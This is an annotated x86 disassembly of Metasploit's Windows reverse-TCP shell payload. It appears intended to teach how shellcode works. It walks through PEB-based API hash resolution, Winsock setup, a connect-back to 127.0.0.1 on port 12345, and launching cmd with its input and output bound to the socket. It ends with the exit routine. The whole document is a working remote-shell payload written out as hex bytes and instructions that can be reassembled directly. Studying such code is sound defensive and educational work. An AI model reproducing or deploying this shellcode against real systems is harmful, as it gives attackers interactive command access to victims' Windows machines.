; metasploit windows reverse tcp shellcode
; msf > use payload windows/shell_reverse_tcp
; msf > generate -f hex
;
; https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
0x0000000000000000:  FC                      cld                                        ; clear direction flag
0x0000000000000001:  E8 82 00 00 00          call   0x88; (start)

; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
api_call:
0x0000000000000006:  60                      pushal
0x0000000000000007:  89 E5                   mov    ebp, esp                            ; create stack frame
0x0000000000000009:  31 C0                   xor    eax, eax
0x000000000000000b:  64 8B 50 30             mov    edx, dword ptr fs:[eax + 0x30]      ; get pointer to PEB
0x000000000000000f:  8B 52 0C                mov    edx, dword ptr [edx + 0xc]
0x0000000000000012:  8B 52 14                mov    edx, dword ptr [edx + 0x14]
next_mod:
0x0000000000000015:  8B 72 28                mov    esi, dword ptr [edx + 0x28]
0x0000000000000018:  0F B7 4A 26             movzx  ecx, word ptr [edx + 0x26]
0x000000000000001c:  31 FF                   xor    edi, edi
loop_modname:
0x000000000000001e:  AC                      lodsb  al, byte ptr [esi]
0x000000000000001f:  3C 61                   cmp    al, 0x61                            ; compare with 'a' to capitalize
0x0000000000000021:  7C 02                   jl     0x25; (not_lowercase)
0x0000000000000023:  2C 20                   sub    al, 0x20                            ; convert to uppercase
not_lowercase:
0x0000000000000025:  C1 CF 0D                ror    edi, 0xd
0x0000000000000028:  01 C7                   add    edi, eax
0x000000000000002a:  E2 F2                   loop   0x1e; (loop_modname)
0x000000000000002c:  52                      push   edx
0x000000000000002d:  57                      push   edi
0x000000000000002e:  8B 52 10                mov    edx, dword ptr [edx + 0x10]
0x0000000000000031:  8B 4A 3C                mov    ecx, dword ptr [edx + 0x3c]
0x0000000000000034:  8B 4C 11 78             mov    ecx, dword ptr [ecx + edx + 0x78]
get_next_func:
0x0000000000000038:  E3 48                   jecxz  0x82; (get_next_mod1)
0x000000000000003a:  01 D1                   add    ecx, edx
0x000000000000003c:  51                      push   ecx
0x000000000000003d:  8B 59 20                mov    ebx, dword ptr [ecx + 0x20]
0x0000000000000040:  01 D3                   add    ebx, edx
0x0000000000000042:  8B 49 18                mov    ecx, dword ptr [ecx + 0x18]
0x0000000000000045:  E3 3A                   jecxz  0x81
0x0000000000000047:  49                      dec    ecx
0x0000000000000048:  8B 34 8B                mov    esi, dword ptr [ebx + ecx*4]
0x000000000000004b:  01 D6                   add    esi, edx
0x000000000000004d:  31 FF                   xor    edi, edi
loop_funcname:
0x000000000000004f:  AC                      lodsb  al, byte ptr [esi]
0x0000000000000050:  C1 CF 0D                ror    edi, 0xd
0x0000000000000053:  01 C7                   add    edi, eax
0x0000000000000055:  38 E0                   cmp    al, ah
0x0000000000000057:  75 F6                   jne    0x4f
0x0000000000000059:  03 7D F8                add    edi, dword ptr [ebp - 8]
0x000000000000005c:  3B 7D 24                cmp    edi, dword ptr [ebp + 0x24]
0x000000000000005f:  75 E4                   jne    0x45
0x0000000000000061:  58                      pop    eax
0x0000000000000062:  8B 58 24                mov    ebx, dword ptr [eax + 0x24]
0x0000000000000065:  01 D3                   add    ebx, edx
0x0000000000000067:  66 8B 0C 4B             mov    cx, word ptr [ebx + ecx*2]
0x000000000000006b:  8B 58 1C                mov    ebx, dword ptr [eax + 0x1c]
0x000000000000006e:  01 D3                   add    ebx, edx
0x0000000000000070:  8B 04 8B                mov    eax, dword ptr [ebx + ecx*4]
0x0000000000000073:  01 D0                   add    eax, edx
finish:
0x0000000000000075:  89 44 24 24             mov    dword ptr [esp + 0x24], eax
0x0000000000000079:  5B                      pop    ebx
0x000000000000007a:  5B                      pop    ebx
0x000000000000007b:  61                      popal  
0x000000000000007c:  59                      pop    ecx
0x000000000000007d:  5A                      pop    edx
0x000000000000007e:  51                      push   ecx
0x000000000000007f:  FF E0                   jmp    eax
0x0000000000000081:  5F                      pop    edi
get_next_mod1:
0x0000000000000082:  5F                      pop    edi
0x0000000000000083:  5A                      pop    edx
0x0000000000000084:  8B 12                   mov    edx, dword ptr [edx]
0x0000000000000086:  EB 8D                   jmp    0x15; (next_mod)

start:
0x0000000000000088:  5D                      pop    ebp

; reverse TCP
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm
reverse_tcp:
0x0000000000000089:  68 33 32 00 00          push   0x3233                              ; '23'
0x000000000000008e:  68 77 73 32 5F          push   0x5f327377                          ; '_2sw'
0x0000000000000093:  54                      push   esp                                 ; lpLibFileName="ws2_32"
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
; HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
0x0000000000000094:  68 4C 77 26 07          push   0x726774c                           ; kernel32.dll!LoadLibraryA
0x0000000000000099:  FF D5                   call   ebp                                 ; LoadLibraryA("ws2_32")

0x000000000000009b:  B8 90 01 00 00          mov    eax, 0x190                          ; sizeof(struct WSAData)
0x00000000000000a0:  29 C4                   sub    esp, eax
0x00000000000000a2:  54                      push   esp                                 ; lpWSAData=pointer to WSADATA
0x00000000000000a3:  50                      push   eax                                 ; wVersionRequested
; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsastartup
; initiates use of the Winsock DLL
;
; int WSAAPI WSAStartup([in] WORD wVersionRequested, [out] LPWSADATA lpWSAData);
;
; returns 0 if successful or error code
0x00000000000000a4:  68 29 80 6B 00          push   0x6b8029                            ; ws2_32.dll!WSAStartup
0x00000000000000a9:  FF D5                   call   ebp                                 ; WSAStartup()
;                                            WSASocketA args
0x00000000000000ab:  50                      push   eax                                 ; dwFlags=0
0x00000000000000ac:  50                      push   eax                                 ; g=0
0x00000000000000ad:  50                      push   eax                                 ; lpProtocolInfo=0
0x00000000000000ae:  50                      push   eax                                 ; protocol=0
0x00000000000000af:  40                      inc    eax
0x00000000000000b0:  50                      push   eax                                 ; type=1 SOCK_STREAM
0x00000000000000b1:  40                      inc    eax
0x00000000000000b2:  50                      push   eax                                 ; af=2 AF_INET
; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
; SOCKET WSAAPI WSASocketA(
;   [in] int                 af,
;   [in] int                 type,
;   [in] int                 protocol,
;   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
;   [in] GROUP               g,
;   [in] DWORD               dwFlags
; );
;
; typedef struct sockaddr {
;   u_short sa_family;
;   char    sa_data[14];
; } SOCKADDR, *PSOCKADDR, *LPSOCKADDR;
;
; returns socket descriptor if no error occurs, otherwise INVALID_SOCKET
0x00000000000000b3:  68 EA 0F DF E0          push   0xe0df0fea                          ; ws2_32.dll!WSASocketA
0x00000000000000b8:  FF D5                   call   ebp                                 ; WSASocketA(AF_INET,SOCK_STREAM,0,0,0,0)

0x00000000000000ba:  97                      xchg   eax, edi                            ; save socket to edi
set_address:
0x00000000000000bb:  6A 05                   push   5                                   ; retry count
0x00000000000000bd:  68 7F 00 00 01          push   0x100007f                           ; 127.0.0.1
0x00000000000000c2:  68 02 00 30 39          push   0x39300002                          ; 12345, AF_INET
0x00000000000000c7:  89 E6                   mov    esi, esp                            ; save pointer to struct sockaddr to esi
try_connect:
0x00000000000000c9:  6A 10                   push   0x10                                ; namelen=16 sizeof(SOCKADDR_IN)
0x00000000000000cb:  56                      push   esi                                 ; name=SOCKADDR_IN
0x00000000000000cc:  57                      push   edi                                 ; s=socket
; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
; int WSAAPI connect([in] SOCKET s, [in] const sockaddr *name, [in] int namelen);
;
; returns 0 if no error occurs, otherwise SOCKET_ERROR
0x00000000000000cd:  68 99 A5 74 61          push   0x6174a599                          ; ws2_32.dll!connect
0x00000000000000d2:  FF D5                   call   ebp                                 ; connect(socket,sockaddr,16)

0x00000000000000d4:  85 C0                   test   eax, eax
0x00000000000000d6:  74 0C                   je     0xe4
handle_failure:
0x00000000000000d8:  FF 4E 08                dec    dword ptr [esi + 8]
0x00000000000000db:  75 EC                   jne    0xc9
failure:
; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess
; void ExitProcess([in] UINT uExitCode);
0x00000000000000dd:  68 F0 B5 A2 56          push   0x56a2b5f0                          ; kernel32.dll!ExitProcess
0x00000000000000e2:  FF D5                   call   ebp                                 ; ExitProcess()
connected:

; reverse shell
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_shell.asm
shell:
0x00000000000000e4:  68 63 6D 64 00          push   0x646d63                            ; 'cmd'
0x00000000000000e9:  89 E3                   mov    ebx, esp                            ; save a pointer to ebx
0x00000000000000eb:  57                      push   edi                                 ; sd
0x00000000000000ec:  57                      push   edi
0x00000000000000ed:  57                      push   edi
0x00000000000000ee:  31 F6                   xor    esi, esi
0x00000000000000f0:  6A 12                   push   0x12
0x00000000000000f2:  59                      pop    ecx
push_loop:
0x00000000000000f3:  56                      push   esi
0x00000000000000f4:  E2 FD                   loop   0xf3; (push_loop)
0x00000000000000f6:  66 C7 44 24 3C 01 01    mov    word ptr [esp + 0x3c], 0x101
0x00000000000000fd:  8D 44 24 10             lea    eax, [esp + 0x10]
0x0000000000000101:  C6 00 44                mov    byte ptr [eax], 0x44
;                                            CreateProcessA args
0x0000000000000104:  54                      push   esp                                 ; lpProcessInformation
0x0000000000000105:  50                      push   eax                                 ; lpStartupInfo
0x0000000000000106:  56                      push   esi                                 ; lpCurrentDirectory=0
0x0000000000000107:  56                      push   esi                                 ; lpEnvironment=0
0x0000000000000108:  56                      push   esi                                 ; dwCreationFlags=0
0x0000000000000109:  46                      inc    esi
0x000000000000010a:  56                      push   esi                                 ; bInheritHandles=1
0x000000000000010b:  4E                      dec    esi
0x000000000000010c:  56                      push   esi                                 ; lpThreadAttributes=0
0x000000000000010d:  56                      push   esi                                 ; lpProcessAttributes=0
0x000000000000010e:  53                      push   ebx                                 ; lpCommandLine='cmd'
0x000000000000010f:  56                      push   esi                                 ; lpApplicationName=0
; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
; BOOL CreateProcessA(
;   [in, optional]      LPCSTR                lpApplicationName,
;   [in, out, optional] LPSTR                 lpCommandLine,
;   [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
;   [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
;   [in]                BOOL                  bInheritHandles,
;   [in]                DWORD                 dwCreationFlags,
;   [in, optional]      LPVOID                lpEnvironment,
;   [in, optional]      LPCSTR                lpCurrentDirectory,
;   [in]                LPSTARTUPINFOA        lpStartupInfo,
;   [out]               LPPROCESS_INFORMATION lpProcessInformation
; );
;
; returns nonzero on success, otherwise 0
0x0000000000000110:  68 79 CC 3F 86          push   0x863fcc79                          ; kernel32.dll!CreateProcessA
0x0000000000000115:  FF D5                   call   ebp                                 ; CreateProcessA(0,"cmd",0,0,1,0,0,0,0,0)

0x0000000000000117:  89 E0                   mov    eax, esp                            ; save pointer of PROCESS_INFORMATION to eax
0x0000000000000119:  4E                      dec    esi
0x000000000000011a:  56                      push   esi
0x000000000000011b:  46                      inc    esi
0x000000000000011c:  FF 30                   push   dword ptr [eax]
; https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
; DWORD WaitForSingleObject([in] HANDLE hHandle, [in] DWORD dwMilliseconds);
0x000000000000011e:  68 08 87 1D 60          push   0x601d8708                          ; kernel32.dll!WaitForSingleObject
0x0000000000000123:  FF D5                   call   ebp                                 ; WaitForSingleObject()

0x0000000000000125:  BB F0 B5 A2 56          mov    ebx, 0x56a2b5f0

; exitfunk
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm

; https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion
; NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion();
;
; returns OS version first word (al) major version and (ah) minor version
0x000000000000012a:  68 A6 95 BD 9D          push   0x9dbd95a6                          ; kernel32.dll!GetVersion
0x000000000000012f:  FF D5                   call   ebp                                 ; GetVersion()

0x0000000000000131:  3C 06                   cmp    al, 6
0x0000000000000133:  7C 0A                   jl     0x13f
0x0000000000000135:  80 FB E0                cmp    bl, 0xe0
0x0000000000000138:  75 05                   jne    0x13f
0x000000000000013a:  BB 47 13 72 6F          mov    ebx, 0x6f721347                     ; ntdll.dll!RtlExitUserThread
goodbye:
0x000000000000013f:  6A 00                   push   0                                   ; exit code
0x0000000000000141:  53                      push   ebx
0x0000000000000142:  FF D5                   call   ebp                                 ; exit thread
